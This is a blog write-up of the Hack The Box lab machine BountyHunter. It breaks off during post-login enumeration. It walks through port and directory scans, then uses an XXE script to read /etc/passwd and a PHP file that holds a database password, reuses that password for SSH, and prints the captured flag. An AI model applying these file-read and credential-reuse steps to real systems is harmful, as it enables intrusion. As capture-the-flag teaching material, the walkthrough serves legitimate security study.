<!doctype html><html lang="es"><head><title>BountyHunter | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to XML External Entity (XXE) injection and that has sudo permissions configured. Some knowledge about XXE, PHP and Python is needed to compromise this machine. This write-up uses a custom Bash script to read files from the server exploiting XXE"><meta itemprop="description" content="Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to XML External Entity (XXE) injection and that has sudo permissions configured. Some knowledge about XXE, PHP and Python is needed to compromise this machine. This write-up uses a custom Bash script to read files from the server exploiting XXE"><meta name="twitter:card" content="Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to XML External Entity (XXE) injection and that has sudo permissions configured. Some knowledge about XXE, PHP and Python is needed to compromise this machine. This write-up uses a custom Bash script to read files from the server exploiting XXE"><meta name="twitter:description" content="Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to XML External Entity (XXE) injection and that has sudo permissions configured. Some knowledge about XXE, PHP and Python is needed to compromise this machine. This write-up uses a custom Bash script to read files from the server exploiting XXE"><meta property="og:description" content="Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to XML External Entity (XXE) injection and that has sudo permissions configured. Some knowledge about XXE, PHP and Python is needed to compromise this machine. This write-up uses a custom Bash script to read files from the server exploiting XXE"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="image" content="https://7rocky.github.io/images/HTB/BountyHunter/BountyHunter.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/BountyHunter/BountyHunter.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/BountyHunter/BountyHunter.png"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta itemprop="name" content="BountyHunter"><meta property="twitter:title" content="BountyHunter"><meta property="og:title" content="BountyHunter"><meta property="og:url" content="https://7rocky.github.io/en/htb/bountyhunter/"><meta itemprop="keywords" content="sudo,python,password-reuse,command-injection,xxe,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/bountyhunter/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/bountyhunter/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/bountyhunter/&text=BountyHunter" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/bountyhunter/&title=BountyHunter" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">BountyHunter</h1><time class="mt4 f6 dib tracked" datetime="2021-11-20T00:00:00+01:00">20 / 11 / 2021</time><br><p class="mb4 f6 dib tracked">8 minutes to read</p></header><div class="htb-image"><img alt="BountyHunter" src="/images/HTB/BountyHunter/BountyHunter.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sudo" title="sudo">sudo</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/command-injection" title="Command Injection">Command Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/xxe" title="XML External Entity">XML External Entity</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-an-xxe">Exploiting an XXE</a></li><li><a href="#finding-a-password">Finding a password</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Easy</li><li><strong>IP Address</strong>: 10.10.11.100</li><li><strong>Release</strong>: 24 / 07 / 2021</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.11.100 -p 22,80
Nmap scan report for 10.10.11.100
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 8.17 seconds
</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we access the website on port 80, we will see something like this:</p><p><img src="/images/HTB/BountyHunter/BountyHunter-web.png" alt="BountyHunter web"></p><p>If we go to &ldquo;PORTAL&rdquo;, we are redirected to this page:</p><p><img src="/images/HTB/BountyHunter/BountyHunter-portal.png" alt="BountyHunter portal"></p><p>And clicking in &ldquo;here&rdquo;, we go to a development portal to create a kind of bug bounty report:</p><p><img src="/images/HTB/BountyHunter/BountyHunter-report.png" alt="BountyHunter report"></p><p>If we fill the data and submit the form, the server responds with the same data and it is rendered in the website:</p><p><img src="/images/HTB/BountyHunter/BountyHunter-report-data.png" alt="BountyHunter report data"></p><p>We can make use of <code>gobuster</code> to fuzz for directories:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gobuster</span> dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q  
/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]
/server-status        (Status: 403) [Size: 276]
</code></pre></div><p>There are some interesting files in the <code>/resources</code> directory (because there is a directory listing vulnerability):</p><p><img src="/images/HTB/BountyHunter/BountyHunter-resources.png" alt="BountyHunter resources"></p><p>Here we can read some tasks for the developer, nothing interesting for the moment:</p><p><img src="/images/HTB/BountyHunter/BountyHunter-tasks.png" alt="BountyHunter tasks"></p><p>However, there is an interesting JavaScript file called <code>bountylog.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> http://10.10.11.100/resources/bountylog.js  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">returnSecret</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">.</span><span class="mtk8">resolve</span><span class="mtk1">(</span>
<span class="mtk1">    $.</span><span class="mtk8">ajax</span><span class="mtk1">({</span>
<span class="mtk1">      </span><span class="mtk1">type</span><span class="mtk1">: </span><span class="mtk4">"POST"</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">data</span><span class="mtk1">: { </span><span class="mtk4">"data"</span><span class="mtk1">: </span><span class="mtk9 mtki">data</span><span class="mtk1"> },</span>
<span class="mtk1">      </span><span class="mtk1">url</span><span class="mtk1">: </span><span class="mtk4">"tracker_diRbPr00f314.php"</span>
<span class="mtk1">    })</span>
<span class="mtk1">  );</span>
<span class="mtk1">}</span>

<span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">bountySubmit</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">xml</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>  
<span class="mtk4">    &lt;bugreport&gt;</span>
<span class="mtk4">    &lt;title&gt;</span><span class="mtk5">${</span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#exploitTitle'</span><span class="mtk1">).</span><span class="mtk8">val</span><span class="mtk1">()</span><span class="mtk5">}</span><span class="mtk4">&lt;/title&gt;</span>
<span class="mtk4">    &lt;cwe&gt;</span><span class="mtk5">${</span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#cwe'</span><span class="mtk1">).</span><span class="mtk8">val</span><span class="mtk1">()</span><span class="mtk5">}</span><span class="mtk4">&lt;/cwe&gt;</span>
<span class="mtk4">    &lt;cvss&gt;</span><span class="mtk5">${</span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#cvss'</span><span class="mtk1">).</span><span class="mtk8">val</span><span class="mtk1">()</span><span class="mtk5">}</span><span class="mtk4">&lt;/cvss&gt;</span>
<span class="mtk4">    &lt;reward&gt;</span><span class="mtk5">${</span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">'#reward'</span><span class="mtk1">).</span><span class="mtk8">val</span><span class="mtk1">()</span><span class="mtk5">}</span><span class="mtk4">&lt;/reward&gt;</span>
<span class="mtk4">    &lt;/bugreport&gt;`</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">returnSecret</span><span class="mtk1">(</span><span class="mtk7">btoa</span><span class="mtk1">(</span><span class="mtk1">xml</span><span class="mtk1">));</span>
<span class="mtk1">    </span><span class="mtk8">$</span><span class="mtk1">(</span><span class="mtk4">"#return"</span><span class="mtk1">).</span><span class="mtk8">html</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">)</span>
<span class="mtk1">  } </span><span class="mtk5">catch</span><span class="mtk1">(</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">'Error:'</span><span class="mtk1">, </span><span class="mtk1">error</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>These functions are executed when submitting the previous form. It is sending the data to <code>tracker_diRbPr00f314.php</code> as an XML document. This is telling us clearly that the attack vector is performing an XML External Entity injection (XXE).</p><h2 id="foothold">Foothold</h2><p>If the server is vulnerable to XXE, then we are able to read files from the server if we know the full path to the file.</p><h3 id="exploiting-an-xxe">Exploiting an XXE</h3><p>To exploit XXE, we can write a Bash script called <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/BountyHunter/xxe.sh"><code>xxe.sh</code></a> to automate the process and extract the desired data (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/BountyHunter#xxesh">here</a>). The idea is to load files from the server as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">xxe.sh</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</code></pre></div><p>To read the PHP source code, we have used a Base64 wrapper to encode the content and afterwards decode it. This way, we avoid bad characters for XML (such as <code>&lt;</code> and <code>></code>).</p><p>We can try some list of files to try when having an LFI, but none are useful. It seems that there must be some sensitive information in the PHP source code, but there is nothing interesting in the ones we know from the website (<code>index.php</code>, <code>portal.php</code>, <code>log_submit.php</code> and <code>tracker_diRbPr00f314.php</code>, all of them from <code>/var/www/html</code>).</p><h3 id="finding-a-password">Finding a password</h3><p>At this point, we can recall that there was a task in the <code>README.txt</code> that talked about a database. After some tries, we see that <code>db.php</code> is found in the server.</p><p>If we were not able to figure out the filename, we can try fuzzing it in Bash as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> f in <span class="code-dark-magenta">$(</span><span class="code-dark-green">cat</span> $WORDLISTS/dirbuster/directory-list-2.3-medium.txt<span class="code-dark-magenta">)</span>; <span class="code-dark-yellow">do</span> <span class="code-dark-green">bash</span> <span class="mtku">xxe.sh</span> /var/www/html/$f.php | <span class="code-dark-green">grep</span> -v <span class="code-dark-yellow">'Nothing found'</span> &><span class="mtku">/dev/null</span> && <span class="code-dark-green">echo</span> Found: /var/www/html/$f.php; <span class="code-dark-yellow">done</span>  
Found: /var/www/html/index.php
Found: /var/www/html/portal.php
Found: /var/www/html/db.php
</code></pre></div><p>And yet another alternative is to return to the <code>gobuster</code> command and add a PHP extension:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gobuster</span> dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.100 -q -x php  
/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]
/portal.php           (Status: 200) [Size: 125]
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]
/server-status        (Status: 403) [Size: 276]
</code></pre></div><p>If we use the previous Bash script to read the <code>db.php</code> file, we see a password:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">xxe.sh</span> /var/www/html/db.php  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
<span class="mtk3">// TODO -&gt; Implement login system with the databas</span><span class="mtk3">e.</span>  
<span class="mtk1">$dbserver </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"localhost"</span><span class="mtk1">;</span>
<span class="mtk1">$dbname </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"bounty"</span><span class="mtk1">;</span>
<span class="mtk1">$dbusername </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"admin"</span><span class="mtk1">;</span>
<span class="mtk1">$dbpassword </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"m19RoAU0hP41A1sTsq6K"</span><span class="mtk1">;</span>
<span class="mtk1">$testuser </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"test"</span><span class="mtk1">;</span>
<span class="mtk5">?</span><span class="mtk5">&gt;</span>
</code></pre></div><p>This password can be used to login via SSH as user <code>development</code>. We know that this user exists because it is listed in <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">xxe.sh</span> /etc/passwd | <span class="code-dark-green">grep</span> sh$
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash  
</code></pre></div><p>And now, we can get the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> development@10.10.11.100
development@10.10.11.100's password:
<span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ cat user.txt  
40b17284532347c9d5a94488e640f2b3
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>User <code>development</code> is able to execute a Python script as <code>root</code> using <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">development@bountyhunter</span>:<span class="code-blue">~</span>$ sudo -l
Matching Defaults entries for development on bountyhunter:
